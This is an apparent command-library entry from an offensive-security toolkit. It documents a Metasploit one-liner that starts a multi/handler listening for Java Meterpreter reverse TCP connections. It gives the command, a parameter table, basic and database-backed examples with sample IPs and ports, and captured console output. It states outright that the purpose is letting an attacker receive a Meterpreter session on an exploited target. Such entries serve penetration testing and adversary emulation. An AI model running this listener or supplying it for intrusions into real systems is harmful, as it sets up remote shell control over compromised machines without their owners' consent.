---
id: 3a1ce76e-6dae-418b-b160-4cc6f21b6c79
name: msfconsole-setup-java-meterpreter-reverse-tcp-handler
type: command
executor: bash
data: >-
  msfconsole -q -x "use exploit/multi/handler; set PAYLOAD
  java/meterpreter/reverse_tcp; set LHOST $_LOCAL_IP; set LPORT $_LOCAL_PORT;
  run; exit -y"
output: >-
  root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD
  java/meterpreter/reverse_tcp; set LHOST 172.16.162.187; set LPORT 1337;
  run;exit -y"

  [-] ***

  [-] * WARNING: No database support: No database YAML file

  [-] ***

  PAYLOAD => java/meterpreter/reverse_tcp

  LHOST => 172.16.162.187

  LPORT => 1337

  [*] Started reverse TCP handler on 172.16.162.187:1337 
created_at: '2019-09-17T17:35:37.339131+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - metasploit
  - handler
  - payload
verified: true
validated: true
---

# msfconsole-setup-java-meterpreter-reverse-tcp-handler

## Command

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST $_LOCAL_IP; set LPORT $_LOCAL_PORT; run; exit -y"
```

## Description

This command launches Metasploit console in quiet mode and automatically configures a multi-handler exploit module to listen for incoming Java Meterpreter reverse TCP connections. It is used to set up a listener for payloads delivered to Java-based targets, such as applets or applications, allowing the attacker to receive a Meterpreter session upon successful exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LOCAL_IP | The local IP address where the handler will listen for connections (e.g., attacker's machine IP) | Yes |
| $_LOCAL_PORT | The local port on which the handler will listen (e.g., 1337) | Yes |
| -q | Quiet mode: Suppresses the banner and non-essential output | No |
| -x | Executes the provided command string directly | Yes |
| use exploit/multi/handler | Selects the multi-handler module for handling various payloads | Built-in |
| set PAYLOAD java/meterpreter/reverse_tcp | Sets the payload to Java Meterpreter reverse TCP | Built-in |
| set LHOST | Sets the host IP for the reverse connection | Built-in |
| set LPORT | Sets the port for the reverse connection | Built-in |
| run | Starts the handler | Built-in |
| exit -y | Exits the console without prompting | Built-in |

## Examples

### Basic Usage

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run; exit -y"
```

### Advanced Usage

For a more persistent setup, run msfconsole interactively and execute the commands manually, or add database support with `msfdb init` beforehand to avoid warnings.

```bash
msfconsole -q -x "db_connect msf:msf@127.0.0.1/msf; use exploit/multi/handler; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST $_LOCAL_IP; set LPORT $_LOCAL_PORT; run;"
```

## Expected Output

Description of what output to expect when the command runs successfully.

```
root@hackers:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD java/meterpreter/reverse_tcp; set LHOST 172.16.162.187; set LPORT 1337; run;exit -y"
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
PAYLOAD => java/meterpreter/reverse_tcp
LHOST => 172.16.162.187
LPORT => 1337
[*] Started reverse TCP handler on 172.16.162.187:1337 
[*] Starting the payload handler...
```

The handler will remain active until a connection is received or manually stopped. Upon successful payload execution on the target, a Meterpreter session will be established.

## Related

- [[Related Procedure: Use Java Meterpreter for Post-Exploitation]]
- [[tools/Metasploit-Framework]]
